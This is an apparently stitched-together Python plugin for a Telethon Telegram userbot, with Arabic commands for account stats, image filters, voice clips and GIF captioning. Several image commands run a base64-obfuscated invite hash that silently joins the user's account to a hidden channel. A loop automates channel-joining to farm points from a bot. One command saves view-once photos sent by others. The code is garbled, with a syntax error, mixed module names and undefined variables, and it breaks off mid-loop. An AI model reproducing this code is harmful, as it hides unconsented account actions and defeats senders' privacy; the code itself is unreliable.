




import asyncio
import random
import glob
import re
import shutil
import urllib
import base64
import requests
import time
import shlex
import math
import os
import html
import io
import sys
import traceback
import requests
import threading
from queue import Queue
from telethon.sync import functions
from threading import Thread
from queue import Queue
import requests
from telethon.sync import functions
from threading import Thread
from telethon import events
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from asyncio import sleep
import telethon.password as pwd_mod
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont
from pySmartDL import SmartDL
from telethon.events import CallbackQuery
from telethon.tl.functions.account import UpdateNotifySettingsRequest
from telethon.errors import FloodWaitError
from telethon.tl import functions
from urlextract import URLExtract
from requests import get
from typing import Optional, Tuple
from telethon.tl.functions.users import GetFullUserRequest
from telethon import events
from telethon.utils import pack_bot_file_id, get_input_location
from telethon.tl.custom import Dialog
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from telethon.tl.types import Channel, Chat, User
from telethon.errors.rpcerrorlist import UsernameOccupiedError
from asyncio.exceptions import TimeoutError as AsyncTimeout
from telethon.errors.rpcerrorlist import MessageTooLongError, YouBlockedUserError
from telethon.tl.types import ChannelParticipantAdmin, ChannelParticipantsBots
from telethon.tl.types import DocumentAttributeVideo as video
from telethon.tl.functions.account import ReportPeerRequest
from telethon.tl.functions.messages import SendMessageRequest
from telethon.tl.functions.messages import SendMediaRequest
from telethon.tl.types import InputMediaPhoto
from telethon.tl.types import InputPhoto
from telethon.tl.types import InputMediaDocument
from telethon.tl.types import InputDocument
from telethon.tl.types import InputReportReasonChildAbuse
from telethon.tl.types import InputReportReasonFake
from telethon.tl.types import InputReportReasonSpam
from telethon.tl.types import InputReportReasonCopyright
from telethon.tl.types import InputReportReasonGeoIrrelevant
from telethon.tl.types import InputReportReasonOther
from telethon.tl.types import InputReportReasonPornography
from telethon.tl.types import InputReportReasonViolence
from telethon.errors.rpcerrorlist import UserAlreadyParticipantError
from telethon.tl.types import InputMessagesFilterMusic
from telethon.tl.functions.channels import GetFullChannelRequest
from telethon.tl.types import InputPeerChannel
from telethon.errors import ChannelPrivateError
from telethon.utils import get_peer_id
from ..helpers import media_type, progress, thumb_from_audio
from ..helpers.utils import _cattools, _catutils, _format, parse_pre, reply_id
from telethon.tl.functions.messages import SaveDraftRequest
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.types import ChannelParticipantsAdmins
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.functions.messages import SendMessageRequest
from hachoir.metadata import extractMetadata
from hachoir.parser import createParser
from ..helpers.progress import humanbytes as hb
from senzir.utils import admin_cmd, sudo_cmd, eor
from telethon.utils import get_display_name
from telethon.tl.functions.account import UpdateUsernameRequest
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest
from telethon.tl.functions.channels import GetMessagesRequest
from telethon.tl.functions.messages import SendVoteRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import SendReactionRequest
#from telethon.tl.types import ReactionEmoji
#from telethon.tl.types import ReactionEmpty
from telethon.tl.functions.messages import SendReactionRequest
from telethon.tl.functions.messages import GetBotCallbackAnswerRequest
from telethon.tl.functions.photos import DeletePhotosRequest, GetUserPhotosRequest
from ..helpers.utils import reply_id as rd
from telethon.tl.types import Channel, Chat, InputPhoto, User
from telethon.errors import ChatAdminRequiredError
from ..sql_helper.GrChhelper import Auto_ChGR, deletAutoChGR, getGrChAuto
from telethon.errors import FloodWaitError, ChannelInvalidError
from ESSA import ESSA 
from ESSA.core.logger import logging
from ..Config import Config
from ..core.managers import edit_delete, edit_or_reply
from . import ALIVE_NAME, AUTONAME, BOTLOG, BOTLOG_CHATID, DEFAULT_BIO, get_user_from_event
from ..helpers import get_user_from_event, reply_id
from ..sql_helper.locks_sql import *
from ..helpers.functions import deEmojify, hide_inlinebot, waifutxt
from senzir.utils.decorators import register
from ..helpers.utils import reply_id, _catutils, parse_pre, yaml_format, install_pip, get_user_from_event, _format
from ESSA.helpers.functions import convert_toimage,    deEmojify,    phcomment,    threats,    trap,    trash
from essa.helpers.functions import convert_tosticker,    flip_image,    grayscale,    invert_colors,    mirror_file,    solarize
from ..sql_helper.global_list import add_to_list, get_collection_list, is_in_list, rm_from_list
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from ..sql_helper.locks_sql import *
from telethon import TelegramClient, client, events
from telethon.tl.functions.contacts import GetBlockedRequest, UnblockRequest
from senzir import BOTLOG_CHATID
from ..sql_helper.globals import addgvar, delgvar, gvarstatus
from ..Config import Config
from telethon import Button
from telethon.tl.functions.messages import ExportChatInviteRequest
from ..core.managers import edit_delete, edit_or_reply
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps
from telethon import functions
from telethon.sync import errors
from . import AUTONAME, BOTLOG, BOTLOG_CHATID, DEFAULT_BIO, _catutils, edit_delete, essa, logging, spamwatch    
def inline_mention(user):
    full_name = user_full_name(user) or "No Name"
    return f"{full_name}"
def user_full_name(user):
    names = [user.first_name]
    names = [i for i in list(names) if i]
    return " ".join(names)
STAT_INDICATION = "**⁂ ⦙   جـاري جـمـع الإحصـائيـات ، انتـظـر 🔄**"
CHANNELS_STR = "**⁂ ⦙   قائمة القنوات التي أنت فيها موجودة هنا\n\n"
CHANNELS_ADMINSTR = "**⁂ ⦙  قائمة القنوات التي تديرها هنا **\n\n"
CHANNELS_OWNERSTR = "**⁂ ⦙  قائمة القنوات التي تمتلك فيها هنا **\n\n"
GROUPS_STR = "**⁂ ⦙  قائمة المجموعات التي أنت فيها موجود هنا **\n\n"
GROUPS_ADMINSTR = "**⁂ ⦙  قائمة المجموعات التي تكون مسؤولاً فيها هنا **\n\n"
GROUPS_OWNERSTR = "**⁂ ⦙  قائمة المجموعات التي تمتلك فيها هنا **\n\n"
INVALID_MEDIA = "**⁂ ⦙  إمتداد هذه الصورة غير صالح  ❌**"
PP_CHANGED = "**⁂ ⦙  تم تغير صورة حسابك بنجاح  ✅**"
PP_TOO_SMOL = "**⁂ ⦙  هذه الصورة صغيرة جدًا قم بإختيار صورة أخرى  ⚠️**"
PP_ERROR = "**⁂ ⦙  حدث خطأ أثناء معالجة الصورة  ⚠️**"
BIO_SUCCESS = "**⁂ ⦙  تم تغيير بايو حسابك بنجاح  ✅**"
FOTOSECRET = gvarstatus("OR_FOTOSECRET") or "(جلب الذاتية|جلب الوقتية|جلب الذاتيه|جلب الوقتيه|سيف)"
ESSA font = gvarstatus("DEFAULT_PIC") or "senzir/sql_helper/essaIMOGE.ttf"
FONT_FILE_TO_USE = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
autopic_path = os.path.join(os.getcwd(), "ESSA ", "original_pic.png")
digitalpic_path = os.path.join(os.getcwd(), "ESSA ", "digital_pic.png")
autophoto_path = os.path.join(os.getcwd(), "ESSA ", "photo_pfp.png")
EMOJI_TELETHON = gvarstatus("ALIVE_EMOJI") or " "
OR_FOTOAUTO = gvarstatus("OR_FOTOAUTO") or "صورة وقتية"
plagiarism = gvarstatus("OR_PLAG") or "انتحال"
unplagiarism = gvarstatus("OR_UNPLAG") or "الغاء الانتحال"
idee = gvarstatus("OR_ID") or "اييديي"
OR_NAMEAUTO = gvarstatus("OR_NAMEAUTO") or "اسم وقتي"
OR_AUTOBIO = gvarstatus("OR_AUTOBIO") or "نبذة وقتية"
AUTOGRCH = ""
FONTGRCH1 = "6335191266"
FONTGRCH2 = gvarstatus("FONTGRCH") or "𝟣𝟤𝟥𝟦𝟧𝟨𝟩𝟪𝟫𝟢"
NAME_OK = "**⁂ ⦙  تم تغيير اسم حسابك بنجاح  ✅**"
USERNAME_SUCCESS = "**⁂ ⦙  تم تغيير معرّف حسابك بنجاح  ✅**"
USERNAME_TAKEN = "**⁂ ⦙  هذا المعرّف مستخدم  ❌**"
plugin_category = "tools"
DEFAULTUSER = gvarstatus("FIRST_NAME") or ALIVE_NAME
DEFAULTUSERBIO = gvarstatus("DEFAULT_BIO") or "الحمد الله"
DEFAULTUSER = AUTONAME or Config.ALIVE_NAME
#LOGS = logging.getLogger(__name__)
Botcompilation = gvarstatus("TGMABOT") or "@EEObot"
digitalpfp = (gvarstatus("AUTO_PIC") or "https://telegra.ph/file/6629cc2f43156292340a5.jpg")
from moviepy.editor import VideoFileClip
from PIL import Image, ImageDraw, ImageSequence, ImageFont
import asyncio, io, os

if not os.path.isdir("./temp"):
    os.makedirs("./temp")
    
PATH = os.path.join("./temp", "temp_vid.mp4")
thumb_loc = os.path.join(Config.TMP_DOWNLOAD_DIRECTORY, "thumb_image.jpg")
async def digitalpicloop():
    DIGITALPICSTART = gvarstatus("صورة وقتية") == "true"
    i = 0
    while DIGITALPICSTART:
        if not os.path.exists(digitalpic_path):
            digitalpfp = gvarstatus("AUTO_PIC")
            downloader = SmartDL(digitalpfp, digitalpic_path, progress_bar=False)
            downloader.start(blocking=False)
            while not downloader.isFinished():
                pass
        shutil.copy(digitalpic_path, autophoto_path)
        Image.open(autophoto_path)
        current_time = datetime.now().strftime("%I:%M")
        img = Image.open(autophoto_path)
        drawn_text = ImageDraw.Draw(img)
        fnt = ImageFont.truetype(f"{essafont}", 200)
        drawn_text.text((300, 400), current_time, font=fnt, fill=(255, 255, 255))
        img.save(autophoto_path)
        file = await essa.upload_file(autophoto_path)
        try:
            if i > 0:
                await essa(
                    functions.photos.DeletePhotosRequest(
                        await essa.get_profile_photos("me", limit=1)
                    )
                )
            i += 1
            await ESSA(functions.photos.UploadProfilePhotoRequest(file))
            os.remove(autophoto_path)
            await asyncio.sleep(60)
        except BaseException:
            return
        DIGITALPICSTART = gvarstatus("صورة وقتية") == "true"





async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE    )
    stdout, stderr = await process.communicate()
    return (        stdout.decode("utf-8", "replace").strip(),        stderr.decode("utf-8", "replace").strip(),        process.returncode,        process.pid,    )    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)
async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)
@ESSA.on(admin_cmd(pattern="احصائيات حسابي(?: |$)(.*)"))
async def stats(event):  
    cat = await edit_or_reply(event, STAT_INDICATION)
    start_time = time.time()
    private_chats = 0
    bots = 0
    groups = 0
    broadcast_channels = 0
    admin_in_groups = 0
    creator_in_groups = 0
    admin_in_broadcast_channels = 0
    creator_in_channels = 0
    unread_mentions = 0
    unread = 0
    dialog: Dialog
    async for dialog in event.client.iter_dialogs():
        entity = dialog.entity
        if isinstance(entity, Channel) and entity.broadcast:
            broadcast_channels += 1
            if entity.creator or entity.admin_rights:
                admin_in_broadcast_channels += 1
            if entity.creator:
                creator_in_channels += 1
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            groups += 1
            if entity.creator or entity.admin_rights:
                admin_in_groups += 1
            if entity.creator:
                creator_in_groups += 1
        elif not isinstance(entity, Channel) and isinstance(entity, User):
            private_chats += 1
            if entity.bot:
                bots += 1
        unread_mentions += dialog.unread_mentions_count
        unread += dialog.unread_count
    stop_time = time.time() - start_time
    full_name = inline_mention(await event.client.get_me())
    response = f"📌 **⋅ ⚜️ |  احصائيات حسـابك العـامة لـ {full_name} 📊** \n"
    response += f"**⁂ ⦙  الدردشات الخاصة 🏷️  :** {private_chats} \n"
    response += f"**⁂ ⦙   الاشـخاص 🚹 : {private_chats - bots}` \n"
    response += f"**⁂ ⦙   الـبوتـات 🤖 : {bots}` **\n"
    response += f"**⁂ ⦙   عـدد المجـموعـات 🚻 :** `{groups}` \n"
    response += f"**⁂ ⦙   عـدد القنـوات  🚻 :** `{broadcast_channels}` \n"
    response += f"**⁂ ⦙   عـدد المجـموعات التـي تكـون فيها ادمـن  🛂 :** `{admin_in_groups}` \n"
    response += f"**⁂ ⦙   عـدد المجموعات التـي أنـشأتـها  🛃** : `{creator_in_groups}` \n"
    response += f"**⁂ ⦙   عـدد القنوات التـي تكـون فيها ادمـن 📶 : `{admin_in_broadcast_channels}` **\n"
    response += f"**⁂ ⦙   حقوق المسؤول في القنوات  🛂 : `{admin_in_broadcast_channels - creator_in_channels}` **\n"
    response += f"**عـدد المحـادثـات الغيـر مقـروء 📄 :** {unread} \n"
    response += f"**عـدد الـتاكـات الغيـر مقـروء 📌 :** {unread_mentions} \n"
    response += f"**⁂ ⦙   استغرق الأمر  🔍  :** `{stop_time:.02f}` ثانيه \n"
    await cat.edit(response)
@ESSA.on(admin_cmd(outgoing=True, pattern="ص1$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois1:
        await vois.client.send_file(vois.chat_id, iqvois1, reply_to=Ti)
        await vois.delete()
@ESSA.on(admin_cmd(outgoing=True, pattern="ص2$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois2:
        await vois.client.send_file(vois.chat_id, iqvois2, reply_to=Ti)
        await vois.delete()
@ESSA.on(events.NewMessage(outgoing=True,pattern='.تجميع دعمكم'))
async def StartCollect(event):
    global collect

    if collect == True:
        await event.reply('عملية الجمع جارية')
    else:
        collect, notice = True, await event.reply('سيتم بدء الجمع قريبا')
        await AddTaksDamKom(event, "@DamKombot")


collect = False
# STOP COLLECT
@ESSA.on(events.NewMessage(outgoing=True,pattern='.ايقاف تجميع دعمكم'))
async def StopCollect(event):
    global collect

    if collect == False:
        await event.reply('عملية الجمع متوقفة')
    else:
        collect = False
        await event.reply('سيتم ايقاف الجمع قريبا')



# JOIN PUBLIC
async def JoinChannel(event, username):
    try:
        Join = await event.client(JoinChannelRequest(channel=username))
        return [True, Join]
    except errors.UserAlreadyParticipantError:
        return [True, Join]
    except errors.FloodWaitError as error:
        return [False, f'تم حظر هذا الحساب من الانضمام للقنوات لمدة : {error.seconds} ثانية']
    except errors.ChannelsTooMuchError:
        return [False, 'هذا الحساب وصل للحد الاقصى من القنوات التي يستطيع الانضمام لها']
    except errors.ChannelInvalidError:
        return [False, False]
    except errors.ChannelPrivateError:
        return [False, False]
    except errors.InviteRequestSentError:
        return [False, False]
    except Exception as error:
        return [False, f'حدث خطأ غير متوقع, اذا كان الحساب يجمع بشكل طبيعي تجاهل هذه الرسالة {error}']
    

# JOIN PRIVATE
async def JoinChannelPrivate(event, username):
    try:
        Join = await event.client(ImportChatInviteRequest(hash=username))
        return [True, Join]
    except errors.UserAlreadyParticipantError:
        return [True, Join]
    except errors.UsersTooMuchError:
        return [False, False]
    except errors.ChannelsTooMuchError:
        return [False, 'هذا الحساب وصل للحد الاقصى من القنوات التي يستطيع الانضمام لها']
    except errors.InviteHashEmptyError:
        return [False, False]
    except errors.InviteHashExpiredError:
        return [False, False]
    except errors.InviteHashInvalidError:
        return [False, False]
    except errors.InviteRequestSentError:
        return [False, False]
    except errors.FloodWaitError as error:
        return [False, f'تم حظر هذا الحساب من الانضمام للقنوات لمدة : {error.seconds} ثانية']
    except Exception as error:
        return [False, f'حدث خطأ غير متوقع, اذا كان الحساب يجمع بشكل طبيعي تجاهل هذه الرسالة {error}']


# Tasks to do
async def AddTaksDamKom(event, bot_username):
    global collect

    while collect != False:
        if collect == False:
                break
        try:
            # start conversation with senzir
            async with event.client.conversation(bot_username, timeout=20) as conv:
                try:
                    # make sure the senzir working
                    while True:
                        start_msg1 = await conv.send_message("/start")
                        resp = await conv.get_response()
                        
                        # check for must join
                        if "يجب عليك الاشتراك" in resp.message:
                            matches = re.findall(r'@(\w+)', resp.message)
                            if matches:
                                channel_url = matches[0]
                                if "+" in channel_url:
                                    result = await JoinChannelPrivate(event, channel_url)
                                else:
                                    result = await JoinChannel(event, channel_url)
                            else:
                                break
                        else:
                            break
                except Exception as error:
                    print ("ERROR (1) :", error)
                    if str(error).startswith('A wait of'):
                        banned_for = ((str(error).split("A wait of")[1]).split("seconds")[0]).strip()
                        await event.reply(f"**محظور من ارسال الرسائل للبوت لمدة : {banned_for}\n\nسيتم ايقاف الجمع لهذه المدة و البدأ من جميع**")
                        try:
                            sleep_seconds = int(banned_for.strip())
                        except:
                            sleep_seconds = 120
                        await asyncio.sleep(sleep_seconds)
                    elif str(error).startswith("cannot access local variable 'resp'"):
                        await event.reply(f'يبدو أن البوت لا يستجيب.. قد يكون محظور أو متوقف حاليا, سيتم ايقاف الجمع راجع البوت يدويا')
                        collect = False
                        break

                try:
                    # go to collect page
                    start_msg1 = await conv.send_message("/start")
                    resp = await conv.get_response()
                    click_collect = await resp.click(1)
                    resp2 = await conv.get_edit()
                    start_collect = await resp2.click(0)
                except Exception as error:
                    print ("ERROR (2) :", error)
                    if str(error).startswith("cannot access local variable 'resp'"):
                        await event.reply(f'يبدو أن البوت لا يستجيب.. قد يكون محظور أو متوقف حاليا, سيتم ايقاف الجمع راجع البوت يدويا')
                        collect = False
                        break

                channel_details = await conv.get_edit()

                # collect now
                for x in range(10):
                    if collect == False:
                        break

                    channel_details = channel_details
                    while True:
                        if collect == False:
                            break

                        matches = re.findall(r'@(\w+)', channel_details.message)
                        if matches:
                            channel_url = matches[0]
                            if "+" in channel_url:
                                result = await JoinChannelPrivate(event, channel_url)
                            else:
                                result = await JoinChannel(event, channel_url)

                            # check next move
                            if result[0] == False:
                                if result[1] == False:
                                    await channel_details.click(1)
                                else:
                                    await event.reply(f"**{result[1]}**")
                                    if str(result[1]).startswith('تم حظر هذا الحساب من الانضمام للقنوات لمدة :'):
                                        seconds = str(result[1]).replace('تم حظر هذا الحساب من الانضمام للقنوات لمدة :', '').replace('ثانية', '')
                                        await event.reply(result[1])
                                        try:
                                            sleep_seconds = int(seconds.strip())
                                        except:
                                            sleep_seconds = 500
                                        await asyncio.sleep(sleep_seconds)
                            else:
                                # check inside senzir
                                cc = await channel_details.click(0)
                                channel_details = await conv.get_edit()
                        else:
                            pass
                        await asyncio.sleep(3.2)

        except Exception as error:
            if str(error) == " ":
                await event.reply(f"**البوت لا يستجيب بسرعه. حاول مراجعته يدويا.. الجمع سيستمر**")
            elif str(error).startswith('Nobody is using this username'):
                await event.reply('يبدو أن هذا البوت محظور, تم ايقاف الجمع')
                collect = False
                break
            elif str(error).startswith("cannot access local variable 'resp'"):
                await event.reply(f'يبدو أن البوت لا يستجيب.. قد يكون محظور أو متوقف حاليا, سيتم ايقاف الجمع راجع البوت يدويا')
                collect = False
                break
            elif str(error) == "Cannot send requests while":
                await event.reply(f"**هذا الرقم غير متصل, الحل.. قم بحذفه و اضافته مرة اخرى بعدها سيبدأ بالجمع عندما يصل دوره**")
                break
            elif str(error).startswith("Cannot open exclusive conversation "):
                pass
            
            print ("conversation (error) :", error)
            await asyncio.sleep(1)
@ESSA.on(admin_cmd(outgoing=True, pattern="ص3$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois3:
        await vois.client.send_file(vois.chat_id, iqvois3, reply_to=Ti)
        await vois.delete()
@ESSA.on(admin_cmd(outgoing=True, pattern="اطار ?(.*)"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiainput = mafia.pattern_match.group(1)
    if not mafiainput:
        mafiainput = 50
    if ";" in str(mafiainput):
        mafiainput, colr = mafiainput.split(";", 1)
    else:
        colr = 0
    mafiainput = int(mafiainput)
    colr = int(colr)
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "تحليل هذه الوسائط")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط!"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if kraken else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, mafiainput, colr)
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    try:
        await mafia.client.send_file(            mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid        )
    except Exception as e:
        return await mafia.edit(f"`{e}`")
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
@essa.on(admin_cmd(outgoing=True, pattern="ص4$"))
async def iqvois(vois):
    if vois.fwd_from:
        return
    Ti = await rd(vois)
    if iqvois4:
        await vois.client.send_file(vois.chat_id, iqvois4, reply_to=Ti)
        await vois.delete()
@essa.on(admin_cmd(outgoing=True, pattern="قلب الصوره$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("`Template not found... `")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if kraken else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)

@essa.on(admin_cmd(pattern=f"{FOTOSECRET}"))
async def thatah(event):
    if not event.is_reply:
        return await event.edit("ُ")
    lll5l = await event.get_reply_message()
    pic = await lll5l.download_media()
    await bot.send_file(        "me",        pic,        caption=f"""
- تـم حفظ الصـورة بنجـاح ✓ 
- CH: @ESSA
  """,
    )
    await event.delete()
# WRITE ON GIFs
async def WriteOnGifs(GifPath, text):
    read_gif = Image.open(GifPath)
    
    frames = []
    for frame in ImageSequence.Iterator(read_gif):
        gif_frame = ImageDraw.Draw(frame)
        font = ImageFont.truetype('senzir/plugins/Alexandria-Regular.ttf', 20, encoding='utf-8')
        gif_frame.text((250,350), text, font=font)
        del gif_frame
        b = io.BytesIO()
        frame.save(b, format="GIF")
        frame = Image.open(b)
        frames.append(frame)
        
    frames[0].save('out.gif', save_all=True, append_images=frames[1:])
    return 'out.gif'


    
# GET REPLYIES ON GIFs
@essa.on(events.NewMessage(outgoing=True, pattern=r'.كتابة متحركة ?(.*)'))
async def GetGifs(event):
    if event.reply_to != None:
        try:
            from telethon.tl.functions.messages import GetMessagesRequest
            message_media = await event.client(GetMessagesRequest(id=[event.reply_to.reply_to_msg_id]))
        except:
            from telethon.tl.functions.channels import GetMessagesRequest
            message_media = await event.client(GetMessagesRequest(channel=event.chat_id, id=[event.reply_to.reply_to_msg_id]))
        
        try:
            if message_media.messages[0].media != None and message_media.messages[0].media.document.mime_type == 'video/mp4':
                edit = await event.edit('**في طور المعالجة و الانجاز**')
                path = await event.client.download_media(message_media.messages[0], 'video_to_edit')
                
                # read the video and convert
                video = VideoFileClip(path)
                gif_path = video.write_gif('converted.gif', fps=10)
                
                text = (event.message.message).replace('.كتابة متحركة', '').strip()
                write_on = await WriteOnGifs('converted.gif', text)
                send_new_gif = await event.client.send_file(entity='me', file=write_on, force_document=True)
                edit = await event.edit('**تم الانجاز**')
                
        except Exception as error:
            print (error)
            edit = await event.edit('**يجب الرد على متحركه**')
            
        
        
@essa.on(admin_cmd(outgoing=True, pattern="فلتر رصاصي$"))
async def memes(mafia):
    reply = await mafia.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(mafia, "الرد على الوسائط المدعومة")
        return
    mafiaid = mafia.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    mafia = await edit_or_reply(mafia, "إحضار بيانات الوسائط")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    mafiasticker = await reply.download_media(file="./temp/")
    if not mafiasticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(mafiasticker)
        await edit_or_reply(mafia, "الوسائط المدعومة غير موجودة")
        return
    import base64

    kraken = None
    if mafiasticker.endswith(".tgs"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐"        )
        mafiafile = os.path.join("./temp/", "meme.png")
        mafiacmd = (            f"lottie_convert.py --frame 0 -if lottie -of png {mafiasticker} {mafiafile}"        )
        stdout, stderr = (await runcmd(mafiacmd))[:2]
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            LOGS.info(stdout + stderr)
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith(".webp"):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        os.rename(mafiasticker, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    elif mafiasticker.endswith((".mp4", ".mov")):
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        mafiafile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(mafiasticker, 0, mafiafile)
        if not os.path.lexists(mafiafile):
            await mafia.edit("القالب غير موجود")
            return
        meme_file = mafiafile
        kraken = True
    else:
        await mafia.edit(            "تحليل هذه الوسائط 🧐!"        )
        meme_file = mafiasticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await mafia.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if kraken else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await mafia.client.send_file(        mafia.chat_id, outputfile, force_document=False, reply_to=mafiaid    )
    await mafia.delete()
    os.remove(outputfile)
    for files in (mafiasticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)
@essa.on(events.NewMessage(outgoing=True, pattern='.فك المحظورين'))
async def UnBlockList(event):

    # GET BLOCKED USERS LIST
    list = await senzir(GetBlockedRequest(offset=0, limit=1000000))

    if len(list.blocked) == 0 :
        order_reply = await event.edit(f'[ ! ] **لم تقم بحظر أي شخص أصلا**')
    else :

        unblocked_count = 1
        for user in list.blocked :

